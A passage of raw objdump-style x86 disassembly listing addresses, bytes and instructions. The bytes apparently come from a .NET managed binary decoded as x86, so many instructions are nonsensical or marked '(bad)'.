  40483f:	2c 3c                	sub    $0x3c,%al
  404841:	07                   	pop    %es
  404842:	7b 47                	jnp    0x40488b
  404844:	00 00                	add    %al,(%eax)
  404846:	04 6f                	add    $0x6f,%al
  404848:	49                   	dec    %ecx
  404849:	00 00                	add    %al,(%eax)
  40484b:	06                   	push   %es
  40484c:	6f                   	outsl  %ds:(%esi),(%dx)
  40484d:	23 00                	and    (%eax),%eax
  40484f:	00 0a                	add    %cl,(%edx)
  404851:	13 04 12             	adc    (%edx,%edx,1),%eax
  404854:	04 28                	add    $0x28,%al
  404856:	24 00                	and    $0x0,%al
  404858:	00 0a                	add    %cl,(%edx)
  40485a:	2d 3e 02 16 25       	sub    $0x2516023e,%eax
  40485f:	0a 7d 63             	or     0x63(%ebp),%bh
  404862:	00 00                	add    %al,(%eax)
  404864:	04 02                	add    $0x2,%al
  404866:	11 04 7d 66 00 00 04 	adc    %eax,0x4000066(,%edi,2)
  40486d:	02 7c 64 00          	add    0x0(%esp,%eiz,2),%bh
  404871:	00 04 12             	add    %al,(%edx,%edx,1)
  404874:	04 02                	add    $0x2,%al
  404876:	28 2d 00 00 2b de    	sub    %ch,0xde2b0000
  40487c:	63 02                	arpl   %eax,(%edx)
  40487e:	7b 66                	jnp    0x4048e6
  404880:	00 00                	add    %al,(%eax)
  404882:	04 13                	add    $0x13,%al
  404884:	04 02                	add    $0x2,%al
  404886:	7c 66                	jl     0x4048ee
  404888:	00 00                	add    %al,(%eax)
  40488a:	04 fe                	add    $0xfe,%al
  40488c:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  404891:	02 15 25 0a 7d 63    	add    0x637d0a25,%dl
  404897:	00 00                	add    %al,(%eax)
  404899:	04 12                	add    $0x12,%al
  40489b:	04 28                	add    $0x28,%al
  40489d:	26 00 00             	add    %al,%es:(%eax)
  4048a0:	0a 0d 09 2d 0a 07    	or     0x70a2d09,%cl
  4048a6:	28 2e                	sub    %ch,(%esi)
  4048a8:	00 00                	add    %al,(%eax)
  4048aa:	06                   	push   %es
  4048ab:	14 0c                	adc    $0xc,%al
  4048ad:	de 1d 09 0c de 19    	ficomps 0x19de0c09
  4048b3:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  4048b9:	63 00                	arpl   %eax,(%eax)
  4048bb:	00 04 02             	add    %al,(%edx,%eax,1)
  4048be:	7c 64                	jl     0x404924
  4048c0:	00 00                	add    %al,(%eax)
  4048c2:	04 11                	add    $0x11,%al
  4048c4:	05 28 99 00 00       	add    $0x9928,%eax
  4048c9:	0a de                	or     %dh,%bl
  4048cb:	14 02                	adc    $0x2,%al
  4048cd:	1f                   	pop    %ds
  4048ce:	fe                   	(bad)
  4048cf:	7d 63                	jge    0x404934
  4048d1:	00 00                	add    %al,(%eax)
  4048d3:	04 02                	add    $0x2,%al
  4048d5:	7c 64                	jl     0x40493b
  4048d7:	00 00                	add    %al,(%eax)
  4048d9:	04 08                	add    $0x8,%al
  4048db:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  4048e1:	00 00                	add    %al,(%eax)
  4048e3:	00 01                	add    %al,(%ecx)
  4048e5:	10 00                	adc    %al,(%eax)
  4048e7:	00 00                	add    %al,(%eax)
  4048e9:	00 0e                	add    %cl,(%esi)
  4048eb:	00 75 83             	add    %dh,-0x7d(%ebp)
  4048ee:	00 19                	add    %bl,(%ecx)
  4048f0:	0b 00                	or     (%eax),%eax
  4048f2:	00 01                	add    %al,(%ecx)
  4048f4:	1b 30                	sbb    (%eax),%esi
  4048f6:	03 00                	add    (%eax),%eax
  4048f8:	b2 00                	mov    $0x0,%dl
  4048fa:	00 00                	add    %al,(%eax)
  4048fc:	1f                   	pop    %ds
  4048fd:	00 00                	add    %al,(%eax)
  4048ff:	11 02                	adc    %eax,(%edx)
  404901:	7b 67                	jnp    0x40496a
  404903:	00 00                	add    %al,(%eax)
  404905:	04 0a                	add    $0xa,%al
  404907:	02 7b 69             	add    0x69(%ebx),%bh
  40490a:	00 00                	add    %al,(%eax)
  40490c:	04 0b                	add    $0xb,%al
  40490e:	06                   	push   %es
  40490f:	2c 40                	sub    $0x40,%al
  404911:	07                   	pop    %es
  404912:	7b 47                	jnp    0x40495b
  404914:	00 00                	add    %al,(%eax)
  404916:	04 02                	add    $0x2,%al
  404918:	7b 6a                	jnp    0x404984
  40491a:	00 00                	add    %al,(%eax)
  40491c:	04 6f                	add    $0x6f,%al
  40491e:	48                   	dec    %eax
  40491f:	00 00                	add    %al,(%eax)
  404921:	06                   	push   %es
  404922:	6f                   	outsl  %ds:(%esi),(%dx)
  404923:	2b 00                	sub    (%eax),%eax
  404925:	00 0a                	add    %cl,(%edx)
  404927:	0d 12 03 28 2c       	or     $0x2c280312,%eax
  40492c:	00 00                	add    %al,(%eax)
  40492e:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  404934:	0a 7d 67             	or     0x67(%ebp),%bh
  404937:	00 00                	add    %al,(%eax)
  404939:	04 02                	add    $0x2,%al
  40493b:	09 7d 6b             	or     %edi,0x6b(%ebp)
  40493e:	00 00                	add    %al,(%eax)
  404940:	04 02                	add    $0x2,%al
  404942:	7c 68                	jl     0x4049ac
  404944:	00 00                	add    %al,(%eax)
  404946:	04 12                	add    $0x12,%al
  404948:	03 02                	add    (%edx),%eax
  40494a:	28 2e                	sub    %ch,(%esi)
  40494c:	00 00                	add    %al,(%eax)
  40494e:	2b de                	sub    %esi,%ebx
  404950:	60                   	pusha
  404951:	02 7b 6b             	add    0x6b(%ebx),%bh
  404954:	00 00                	add    %al,(%eax)
  404956:	04 0d                	add    $0xd,%al
  404958:	02 7c 6b 00          	add    0x0(%ebx,%ebp,2),%bh
  40495c:	00 04 fe             	add    %al,(%esi,%edi,8)
  40495f:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  404964:	02 15 25 0a 7d 67    	add    0x677d0a25,%dl
  40496a:	00 00                	add    %al,(%eax)
  40496c:	04 12                	add    $0x12,%al
  40496e:	03 28                	add    (%eax),%ebp
  404970:	2d 00 00 0a 2d       	sub    $0x2d0a0000,%eax
  404975:	0a 07                	or     (%edi),%al
  404977:	28 2e                	sub    %ch,(%esi)
  404979:	00 00                	add    %al,(%eax)
  40497b:	06                   	push   %es
  40497c:	16                   	push   %ss
  40497d:	0c de                	or     $0xde,%al
  40497f:	1d 17 0c de 19       	sbb    $0x19de0c17,%eax
  404984:	13 04 02             	adc    (%edx,%eax,1),%eax
  404987:	1f                   	pop    %ds
  404988:	fe                   	(bad)
  404989:	7d 67                	jge    0x4049f2
  40498b:	00 00                	add    %al,(%eax)
  40498d:	04 02                	add    $0x2,%al
  40498f:	7c 68                	jl     0x4049f9
  404991:	00 00                	add    %al,(%eax)
  404993:	04 11                	add    $0x11,%al
  404995:	04 28                	add    $0x28,%al
  404997:	7c 00                	jl     0x404999
  404999:	00 0a                	add    %cl,(%edx)
  40499b:	de 14 02             	ficoms (%edx,%eax,1)
  40499e:	1f                   	pop    %ds
  40499f:	fe                   	(bad)
  4049a0:	7d 67                	jge    0x404a09
  4049a2:	00 00                	add    %al,(%eax)
  4049a4:	04 02                	add    $0x2,%al
  4049a6:	7c 68                	jl     0x404a10
  4049a8:	00 00                	add    %al,(%eax)
  4049aa:	04 08                	add    $0x8,%al
  4049ac:	28 7d 00             	sub    %bh,0x0(%ebp)
  4049af:	00 0a                	add    %cl,(%edx)
  4049b1:	2a 00                	sub    (%eax),%al
  4049b3:	00 01                	add    %al,(%ecx)
  4049b5:	10 00                	adc    %al,(%eax)
  4049b7:	00 00                	add    %al,(%eax)
  4049b9:	00 0e                	add    %cl,(%esi)
  4049bb:	00 76 84             	add    %dh,-0x7c(%esi)
  4049be:	00 19                	add    %bl,(%ecx)
  4049c0:	0b 00                	or     (%eax),%eax
  4049c2:	00 01                	add    %al,(%ecx)
  4049c4:	13 30                	adc    (%eax),%esi
  4049c6:	02 00                	add    (%eax),%al
  4049c8:	3f                   	aas
  4049c9:	00 00                	add    %al,(%eax)
  4049cb:	00 20                	add    %ah,(%eax)
  4049cd:	00 00                	add    %al,(%eax)
  4049cf:	11 12                	adc    %edx,(%edx)
  4049d1:	00 28                	add    %ch,(%eax)
  4049d3:	74 00                	je     0x4049d5
  4049d5:	00 0a                	add    %cl,(%edx)
  4049d7:	7d 84                	jge    0x40495d
  4049d9:	00 00                	add    %al,(%eax)
  4049db:	04 12                	add    $0x12,%al
  4049dd:	00 02                	add    %al,(%edx)
  4049df:	7d 86                	jge    0x404967
  4049e1:	00 00                	add    %al,(%eax)
  4049e3:	04 12                	add    $0x12,%al
  4049e5:	00 03                	add    %al,(%ebx)
  4049e7:	7d 85                	jge    0x40496e
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	04 12                	add    $0x12,%al
  4049ed:	00 15 7d 83 00 00    	add    %dl,0x837d
  4049f3:	04 12                	add    $0x12,%al
  4049f5:	00 7c 84 00          	add    %bh,0x0(%esp,%eax,4)
  4049f9:	00 04 12             	add    %al,(%edx,%edx,1)
  4049fc:	00 28                	add    %ch,(%eax)
  4049fe:	2f                   	das
  4049ff:	00 00                	add    %al,(%eax)
  404a01:	2b 12                	sub    (%edx),%edx
  404a03:	00 7c 84 00          	add    %bh,0x0(%esp,%eax,4)
  404a07:	00 04 28             	add    %al,(%eax,%ebp,1)
  404a0a:	76 00                	jbe    0x404a0c
  404a0c:	00 0a                	add    %cl,(%edx)
  404a0e:	2a 00                	sub    (%eax),%al
  404a10:	13 30                	adc    (%eax),%esi
  404a12:	02 00                	add    (%eax),%al
  404a14:	3f                   	aas
  404a15:	00 00                	add    %al,(%eax)
  404a17:	00 21                	add    %ah,(%ecx)
  404a19:	00 00                	add    %al,(%eax)
  404a1b:	11 12                	adc    %edx,(%edx)
  404a1d:	00 28                	add    %ch,(%eax)
  404a1f:	74 00                	je     0x404a21
  404a21:	00 0a                	add    %cl,(%edx)
  404a23:	7d 79                	jge    0x404a9e
  404a25:	00 00                	add    %al,(%eax)
  404a27:	04 12                	add    $0x12,%al
  404a29:	00 02                	add    %al,(%edx)
  404a2b:	7d 7b                	jge    0x404aa8
  404a2d:	00 00                	add    %al,(%eax)
  404a2f:	04 12                	add    $0x12,%al
  404a31:	00 03                	add    %al,(%ebx)
  404a33:	7d 7a                	jge    0x404aaf
  404a35:	00 00                	add    %al,(%eax)
  404a37:	04 12                	add    $0x12,%al
  404a39:	00 15 7d 78 00 00    	add    %dl,0x787d
  404a3f:	04 12                	add    $0x12,%al
  404a41:	00 7c 79 00          	add    %bh,0x0(%ecx,%edi,2)
  404a45:	00 04 12             	add    %al,(%edx,%edx,1)
  404a48:	00 28                	add    %ch,(%eax)
  404a4a:	30 00                	xor    %al,(%eax)
  404a4c:	00 2b                	add    %ch,(%ebx)
  404a4e:	12 00                	adc    (%eax),%al
  404a50:	7c 79                	jl     0x404acb
  404a52:	00 00                	add    %al,(%eax)
  404a54:	04 28                	add    $0x28,%al
  404a56:	76 00                	jbe    0x404a58
  404a58:	00 0a                	add    %cl,(%edx)
  404a5a:	2a 00                	sub    (%eax),%al
  404a5c:	13 30                	adc    (%eax),%esi
  404a5e:	03 00                	add    (%eax),%eax
  404a60:	48                   	dec    %eax
  404a61:	00 00                	add    %al,(%eax)
  404a63:	00 00                	add    %al,(%eax)
  404a65:	00 00                	add    %al,(%eax)
  404a67:	00 02                	add    %al,(%edx)
  404a69:	2d 08 16 8d 2e       	sub    $0x2e8d1608,%eax
  404a6e:	00 00                	add    %al,(%eax)
  404a70:	01 10                	add    %edx,(%eax)
  404a72:	00 73 9d             	add    %dh,-0x63(%ebx)
  404a75:	00 00                	add    %al,(%eax)
  404a77:	0a 25 02 6f 9e 00    	or     0x9e6f02,%ah
  404a7d:	00 0a                	add    %cl,(%edx)
  404a7f:	25 03 6f 9e 00       	and    $0x9e6f03,%eax
  404a84:	00 0a                	add    %cl,(%edx)
  404a86:	7e 73                	jle    0x404afb
  404a88:	00 00                	add    %al,(%eax)
  404a8a:	04 25                	add    $0x25,%al
  404a8c:	2d 17 26 7e 72       	sub    $0x727e2617,%eax
  404a91:	00 00                	add    %al,(%eax)
  404a93:	04 fe                	add    $0xfe,%al
  404a95:	06                   	push   %es
  404a96:	50                   	push   %eax
  404a97:	00 00                	add    %al,(%eax)
  404a99:	06                   	push   %es
  404a9a:	73 9f                	jae    0x404a3b
  404a9c:	00 00                	add    %al,(%eax)
  404a9e:	0a 25 80 73 00 00    	or     0x7380,%ah
  404aa4:	04 28                	add    $0x28,%al
  404aa6:	31 00                	xor    %eax,(%eax)
  404aa8:	00 2b                	add    %ch,(%ebx)
  404aaa:	28 12                	sub    %dl,(%edx)
  404aac:	00 00                	add    %al,(%eax)
  404aae:	2b 2a                	sub    (%edx),%ebp
  404ab0:	13 30                	adc    (%eax),%esi
  404ab2:	04 00                	add    $0x0,%al
  404ab4:	33 00                	xor    (%eax),%eax
  404ab6:	00 00                	add    %al,(%eax)
  404ab8:	22 00                	and    (%eax),%al
  404aba:	00 11                	add    %dl,(%ecx)
  404abc:	73 41                	jae    0x404aff
  404abe:	00 00                	add    %al,(%eax)
  404ac0:	06                   	push   %es
  404ac1:	0a 03                	or     (%ebx),%al
  404ac3:	16                   	push   %ss
  404ac4:	91                   	xchg   %eax,%ecx
  404ac5:	17                   	pop    %ss
  404ac6:	33 1e                	xor    (%esi),%ebx
  404ac8:	06                   	push   %es
  404ac9:	17                   	pop    %ss
  404aca:	7d 6c                	jge    0x404b38
  404acc:	00 00                	add    %al,(%eax)
  404ace:	04 06                	add    $0x6,%al
  404ad0:	02 03                	add    (%ebx),%al
  404ad2:	17                   	pop    %ss
  404ad3:	28 4a 00             	sub    %cl,0x0(%edx)
  404ad6:	00 06                	add    %al,(%esi)
  404ad8:	7d 6d                	jge    0x404b47
  404ada:	00 00                	add    %al,(%eax)
  404adc:	04 06                	add    $0x6,%al
  404ade:	1b 7d 6e             	sbb    0x6e(%ebp),%edi
  404ae1:	00 00                	add    %al,(%eax)
  404ae3:	04 2b                	add    $0x2b,%al
  404ae5:	07                   	pop    %es
  404ae6:	03 16                	add    (%esi),%edx
  404ae8:	91                   	xchg   %eax,%ecx
  404ae9:	2c 02                	sub    $0x2,%al
  404aeb:	14 2a                	adc    $0x2a,%al
  404aed:	06                   	push   %es
  404aee:	2a 00                	sub    (%eax),%al
  404af0:	13 30                	adc    (%eax),%esi
  404af2:	05 00 19 00 00       	add    $0x1900,%eax
  404af7:	00 23                	add    %ah,(%ebx)
  404af9:	00 00                	add    %al,(%eax)
  404afb:	11 03                	adc    %eax,(%ebx)
  404afd:	8e 69 04             	mov    0x4(%ecx),%gs
  404b00:	59                   	pop    %ecx
  404b01:	8d 2e                	lea    (%esi),%ebp
  404b03:	00 00                	add    %al,(%eax)
  404b05:	01 0a                	add    %ecx,(%edx)
  404b07:	03 04 06             	add    (%esi,%eax,1),%eax
  404b0a:	16                   	push   %ss
  404b0b:	06                   	push   %es
  404b0c:	8e 69 28             	mov    0x28(%ecx),%gs
  404b0f:	a1 00 00 0a 06       	mov    0x60a0000,%eax
  404b14:	2a 00                	sub    (%eax),%al
  404b16:	00 00                	add    %al,(%eax)
  404b18:	13 30                	adc    (%eax),%esi
  404b1a:	02 00                	add    (%eax),%al
  404b1c:	3f                   	aas
  404b1d:	00 00                	add    %al,(%eax)
  404b1f:	00 24 00             	add    %ah,(%eax,%eax,1)
  404b22:	00 11                	add    %dl,(%ecx)
  404b24:	12 00                	adc    (%eax),%al
  404b26:	28 77 00             	sub    %dh,0x0(%edi)
  404b29:	00 0a                	add    %cl,(%edx)
  404b2b:	7d 8c                	jge    0x404ab9
  404b2d:	00 00                	add    %al,(%eax)
  404b2f:	04 12                	add    $0x12,%al
  404b31:	00 02                	add    %al,(%edx)
  404b33:	7d 8e                	jge    0x404ac3
  404b35:	00 00                	add    %al,(%eax)
  404b37:	04 12                	add    $0x12,%al
  404b39:	00 03                	add    %al,(%ebx)
  404b3b:	7d 8d                	jge    0x404aca
  404b3d:	00 00                	add    %al,(%eax)
  404b3f:	04 12                	add    $0x12,%al
  404b41:	00 15 7d 8b 00 00    	add    %dl,0x8b7d
  404b47:	04 12                	add    $0x12,%al
  404b49:	00 7c 8c 00          	add    %bh,0x0(%esp,%ecx,4)
  404b4d:	00 04 12             	add    %al,(%edx,%edx,1)
  404b50:	00 28                	add    %ch,(%eax)
  404b52:	32 00                	xor    (%eax),%al
  404b54:	00 2b                	add    %ch,(%ebx)
  404b56:	12 00                	adc    (%eax),%al
  404b58:	7c 8c                	jl     0x404ae6
  404b5a:	00 00                	add    %al,(%eax)
  404b5c:	04 28                	add    $0x28,%al
  404b5e:	79 00                	jns    0x404b60
  404b60:	00 0a                	add    %cl,(%edx)
  404b62:	2a 00                	sub    (%eax),%al
  404b64:	13 30                	adc    (%eax),%esi
  404b66:	02 00                	add    (%eax),%al
  404b68:	37                   	aaa
  404b69:	00 00                	add    %al,(%eax)
  404b6b:	00 25 00 00 11 12    	add    %ah,0x12110000
  404b71:	00 28                	add    %ch,(%eax)
  404b73:	74 00                	je     0x404b75
  404b75:	00 0a                	add    %cl,(%edx)
  404b77:	7d 75                	jge    0x404bee
  404b79:	00 00                	add    %al,(%eax)
  404b7b:	04 12                	add    $0x12,%al
  404b7d:	00 02                	add    %al,(%edx)
  404b7f:	7d 76                	jge    0x404bf7
  404b81:	00 00                	add    %al,(%eax)
  404b83:	04 12                	add    $0x12,%al
  404b85:	00 15 7d 74 00 00    	add    %dl,0x747d
  404b8b:	04 12                	add    $0x12,%al
  404b8d:	00 7c 75 00          	add    %bh,0x0(%ebp,%esi,2)
  404b91:	00 04 12             	add    %al,(%edx,%edx,1)
  404b94:	00 28                	add    %ch,(%eax)
  404b96:	33 00                	xor    (%eax),%eax
  404b98:	00 2b                	add    %ch,(%ebx)
  404b9a:	12 00                	adc    (%eax),%al
  404b9c:	7c 75                	jl     0x404c13
  404b9e:	00 00                	add    %al,(%eax)
  404ba0:	04 28                	add    $0x28,%al
  404ba2:	76 00                	jbe    0x404ba4
  404ba4:	00 0a                	add    %cl,(%edx)
  404ba6:	2a 00                	sub    (%eax),%al
  404ba8:	13 30                	adc    (%eax),%esi
  404baa:	04 00                	add    $0x0,%al
  404bac:	43                   	inc    %ebx
  404bad:	00 00                	add    %al,(%eax)
  404baf:	00 00                	add    %al,(%eax)
  404bb1:	00 00                	add    %al,(%eax)
  404bb3:	00 7e a2             	add    %bh,-0x5e(%esi)
  404bb6:	00 00                	add    %al,(%eax)
  404bb8:	0a 2c 1e             	or     (%esi,%ebx,1),%ch
  404bbb:	03 04 91             	add    (%ecx,%edx,4),%eax
  404bbe:	03 04 17             	add    (%edi,%edx,1),%eax
  404bc1:	58                   	pop    %eax
  404bc2:	91                   	xchg   %eax,%ecx
  404bc3:	1e                   	push   %ds
  404bc4:	62 60 03             	bound  %esp,0x3(%eax)
  404bc7:	04 18                	add    $0x18,%al
  404bc9:	58                   	pop    %eax
  404bca:	91                   	xchg   %eax,%ecx
  404bcb:	1f                   	pop    %ds
  404bcc:	10 62 60             	adc    %ah,0x60(%edx)
  404bcf:	03 04 19             	add    (%ecx,%ebx,1),%eax
  404bd2:	58                   	pop    %eax
  404bd3:	91                   	xchg   %eax,%ecx
  404bd4:	1f                   	pop    %ds
  404bd5:	18 62 60             	sbb    %ah,0x60(%edx)
  404bd8:	2a 03                	sub    (%ebx),%al
  404bda:	04 19                	add    $0x19,%al
  404bdc:	58                   	pop    %eax
  404bdd:	91                   	xchg   %eax,%ecx
  404bde:	03 04 18             	add    (%eax,%ebx,1),%eax
  404be1:	58                   	pop    %eax
  404be2:	91                   	xchg   %eax,%ecx
  404be3:	1e                   	push   %ds
  404be4:	62 60 03             	bound  %esp,0x3(%eax)
  404be7:	04 17                	add    $0x17,%al
  404be9:	58                   	pop    %eax
  404bea:	91                   	xchg   %eax,%ecx
  404beb:	1f                   	pop    %ds
  404bec:	10 62 60             	adc    %ah,0x60(%edx)
  404bef:	03 04 91             	add    (%ecx,%edx,4),%eax
  404bf2:	1f                   	pop    %ds
  404bf3:	18 62 60             	sbb    %ah,0x60(%edx)
  404bf6:	2a 00                	sub    (%eax),%al
  404bf8:	13 30                	adc    (%eax),%esi
  404bfa:	04 00                	add    $0x0,%al
  404bfc:	4a                   	dec    %edx
  404bfd:	00 00                	add    %al,(%eax)
  404bff:	00 23                	add    %ah,(%ebx)
  404c01:	00 00                	add    %al,(%eax)
  404c03:	11 1a                	adc    %ebx,(%edx)
  404c05:	8d 2e                	lea    (%esi),%ebp
  404c07:	00 00                	add    %al,(%eax)
  404c09:	01 0a                	add    %ecx,(%edx)
  404c0b:	7e a2                	jle    0x404baf
  404c0d:	00 00                	add    %al,(%eax)
  404c0f:	0a 2c 1e             	or     (%esi,%ebx,1),%ch
  404c12:	06                   	push   %es
  404c13:	16                   	push   %ss
  404c14:	03 d2                	add    %edx,%edx
  404c16:	9c                   	pushf
  404c17:	06                   	push   %es
  404c18:	17                   	pop    %ss
  404c19:	03 1e                	add    (%esi),%ebx
  404c1b:	63 d2                	arpl   %edx,%edx
  404c1d:	9c                   	pushf
  404c1e:	06                   	push   %es
  404c1f:	18 03                	sbb    %al,(%ebx)
  404c21:	1f                   	pop    %ds
  404c22:	10 63 d2             	adc    %ah,-0x2e(%ebx)
  404c25:	9c                   	pushf
  404c26:	06                   	push   %es
  404c27:	19 03                	sbb    %eax,(%ebx)
  404c29:	1f                   	pop    %ds
  404c2a:	18 63 d2             	sbb    %ah,-0x2e(%ebx)
  404c2d:	9c                   	pushf
  404c2e:	2b 1c 06             	sub    (%esi,%eax,1),%ebx
  404c31:	19 03                	sbb    %eax,(%ebx)
  404c33:	d2 9c 06 18 03 1e 63 	rcrb   %cl,0x631e0318(%esi,%eax,1)
  404c3a:	d2 9c 06 17 03 1f 10 	rcrb   %cl,0x101f0317(%esi,%eax,1)
  404c41:	63 d2                	arpl   %edx,%edx
  404c43:	9c                   	pushf
  404c44:	06                   	push   %es
  404c45:	16                   	push   %ss
  404c46:	03 1f                	add    (%edi),%ebx
  404c48:	18 63 d2             	sbb    %ah,-0x2e(%ebx)
  404c4b:	9c                   	pushf
  404c4c:	06                   	push   %es
  404c4d:	2a 00                	sub    (%eax),%al
  404c4f:	00 1b                	add    %bl,(%ebx)
  404c51:	30 03                	xor    %al,(%ebx)
  404c53:	00 fa                	add    %bh,%dl
  404c55:	01 00                	add    %eax,(%eax)
  404c57:	00 26                	add    %ah,(%esi)
  404c59:	00 00                	add    %al,(%eax)
  404c5b:	11 02                	adc    %eax,(%edx)
  404c5d:	7b 74                	jnp    0x404cd3
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	04 0a                	add    $0xa,%al
  404c63:	02 7b 76             	add    0x76(%ebx),%bh
  404c66:	00 00                	add    %al,(%eax)
  404c68:	04 0b                	add    $0xb,%al
  404c6a:	06                   	push   %es
  404c6b:	17                   	pop    %ss
  404c6c:	26 26 00 06          	es add %al,%es:(%esi)
  404c70:	2c 42                	sub    $0x42,%al
  404c72:	06                   	push   %es
  404c73:	17                   	pop    %ss
  404c74:	3b b0 00 00 00 07    	cmp    0x7000000(%eax),%esi
  404c7a:	1a 28                	sbb    (%eax),%ch
  404c7c:	43                   	inc    %ebx
  404c7d:	00 00                	add    %al,(%eax)
  404c7f:	06                   	push   %es
  404c80:	6f                   	outsl  %ds:(%esi),(%dx)
  404c81:	23 00                	and    (%eax),%eax
  404c83:	00 0a                	add    %cl,(%edx)
  404c85:	13 07                	adc    (%edi),%eax
  404c87:	12 07                	adc    (%edi),%al
  404c89:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404c8c:	00 0a                	add    %cl,(%edx)
  404c8e:	2d 41 02 16 25       	sub    $0x25160241,%eax
  404c93:	0a 7d 74             	or     0x74(%ebp),%bh
  404c96:	00 00                	add    %al,(%eax)
  404c98:	04 02                	add    $0x2,%al
  404c9a:	11 07                	adc    %eax,(%edi)
  404c9c:	7d 77                	jge    0x404d15
  404c9e:	00 00                	add    %al,(%eax)
  404ca0:	04 02                	add    $0x2,%al
  404ca2:	7c 75                	jl     0x404d19
  404ca4:	00 00                	add    %al,(%eax)
  404ca6:	04 12                	add    $0x12,%al
  404ca8:	07                   	pop    %es
  404ca9:	02 28                	add    (%eax),%ch
  404cab:	34 00                	xor    $0x0,%al
  404cad:	00 2b                	add    %ch,(%ebx)
  404caf:	dd a1 01 00 00 02    	frstor 0x2000001(%ecx)
  404cb5:	7b 77                	jnp    0x404d2e
  404cb7:	00 00                	add    %al,(%eax)
  404cb9:	04 13                	add    $0x13,%al
  404cbb:	07                   	pop    %es
  404cbc:	02 7c 77 00          	add    0x0(%edi,%esi,2),%bh
  404cc0:	00 04 fe             	add    %al,(%esi,%edi,8)
  404cc3:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  404cc8:	02 15 25 0a 7d 74    	add    0x747d0a25,%dl
  404cce:	00 00                	add    %al,(%eax)
  404cd0:	04 12                	add    $0x12,%al
  404cd2:	07                   	pop    %es
  404cd3:	28 26                	sub    %ah,(%esi)
  404cd5:	00 00                	add    %al,(%eax)
  404cd7:	0a 0d 09 2d 07 14    	or     0x14072d09,%cl
  404cdd:	0c dd                	or     $0xdd,%al
  404cdf:	5e                   	pop    %esi
  404ce0:	01 00                	add    %eax,(%eax)
  404ce2:	00 07                	add    %al,(%edi)
  404ce4:	09 16                	or     %edx,(%esi)
  404ce6:	28 4a 00             	sub    %cl,0x0(%edx)
  404ce9:	00 06                	add    %al,(%esi)
  404ceb:	13 04 07             	adc    (%edi,%eax,1),%eax
  404cee:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404cf1:	43                   	inc    %ebx
  404cf2:	00 00                	add    %al,(%eax)
  404cf4:	06                   	push   %es
  404cf5:	6f                   	outsl  %ds:(%esi),(%dx)
  404cf6:	23 00                	and    (%eax),%eax
  404cf8:	00 0a                	add    %cl,(%edx)
  404cfa:	13 07                	adc    (%edi),%eax
  404cfc:	12 07                	adc    (%edi),%al
  404cfe:	28 24 00             	sub    %ah,(%eax,%eax,1)
  404d01:	00 0a                	add    %cl,(%edx)
  404d03:	2d 41 02 17 25       	sub    $0x25170241,%eax
  404d08:	0a 7d 74             	or     0x74(%ebp),%bh
  404d0b:	00 00                	add    %al,(%eax)
  404d0d:	04 02                	add    $0x2,%al
  404d0f:	11 07                	adc    %eax,(%edi)
  404d11:	7d 77                	jge    0x404d8a
  404d13:	00 00                	add    %al,(%eax)
  404d15:	04 02                	add    $0x2,%al
  404d17:	7c 75                	jl     0x404d8e
  404d19:	00 00                	add    %al,(%eax)
  404d1b:	04 12                	add    $0x12,%al
  404d1d:	07                   	pop    %es
  404d1e:	02 28                	add    (%eax),%ch
  404d20:	34 00                	xor    $0x0,%al
  404d22:	00 2b                	add    %ch,(%ebx)
  404d24:	dd 2c 01             	(bad) (%ecx,%eax,1)
  404d27:	00 00                	add    %al,(%eax)
  404d29:	02 7b 77             	add    0x77(%ebx),%bh
  404d2c:	00 00                	add    %al,(%eax)
  404d2e:	04 13                	add    $0x13,%al
  404d30:	07                   	pop    %es
  404d31:	02 7c 77 00          	add    0x0(%edi,%esi,2),%bh
  404d35:	00 04 fe             	add    %al,(%esi,%edi,8)
  404d38:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  404d3d:	02 15 25 0a 7d 74    	add    0x747d0a25,%dl
  404d43:	00 00                	add    %al,(%eax)
  404d45:	04 12                	add    $0x12,%al
  404d47:	07                   	pop    %es
  404d48:	28 26                	sub    %ah,(%esi)
  404d4a:	00 00                	add    %al,(%eax)
  404d4c:	0a 13                	or     (%ebx),%dl
  404d4e:	05 11 05 2d 07       	add    $0x72d0511,%eax
  404d53:	14 0c                	adc    $0xc,%al
  404d55:	dd e7                	fucom  %st(7)
  404d57:	00 00                	add    %al,(%eax)
  404d59:	00 11                	add    %dl,(%ecx)
  404d5b:	05 16 91 19 33       	add    $0x33199116,%eax
  404d60:	68 07 11 05 17       	push   $0x17051107
  404d65:	28 47 00             	sub    %al,0x0(%edi)
  404d68:	00 06                	add    %al,(%esi)
  404d6a:	13 05 11 05 07 7b    	adc    0x7b070511,%eax
  404d70:	70 00                	jo     0x404d72
  404d72:	00 04 28             	add    %al,(%eax,%ebp,1)
  404d75:	0f 00 00             	sldt   (%eax)
  404d78:	06                   	push   %es
  404d79:	13 05 11 05 16 91    	adc    0x91160511,%eax
  404d7f:	18 3b                	sbb    %bh,(%ebx)
  404d81:	f4                   	hlt
  404d82:	fe                   	(bad)
  404d83:	ff                   	(bad)
  404d84:	ff 07                	incl   (%edi)
  404d86:	11 05 28 46 00 00    	adc    %eax,0x4628
  404d8c:	06                   	push   %es
  404d8d:	13 06                	adc    (%esi),%eax
  404d8f:	11 06                	adc    %eax,(%esi)
  404d91:	2d 07 14 0c dd       	sub    $0xdd0c1407,%eax
  404d96:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404d97:	00 00                	add    %al,(%eax)
  404d99:	00 07                	add    %al,(%edi)
  404d9b:	11 05 11 06 7b 6e    	adc    %eax,0x6e7b0611
  404da1:	00 00                	add    %al,(%eax)
  404da3:	04 28                	add    $0x28,%al
  404da5:	47                   	inc    %edi
  404da6:	00 00                	add    %al,(%eax)
  404da8:	06                   	push   %es
  404da9:	13 05 11 06 7b 6c    	adc    0x6c7b0611,%eax
  404daf:	00 00                	add    %al,(%eax)
  404db1:	04 2c                	add    $0x2c,%al
  404db3:	10 11                	adc    %dl,(%ecx)
  404db5:	05 11 06 7b 6d       	add    $0x6d7b0611,%eax
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	04 28                	add    $0x28,%al
  404dbe:	07                   	pop    %es
  404dbf:	00 00                	add    %al,(%eax)
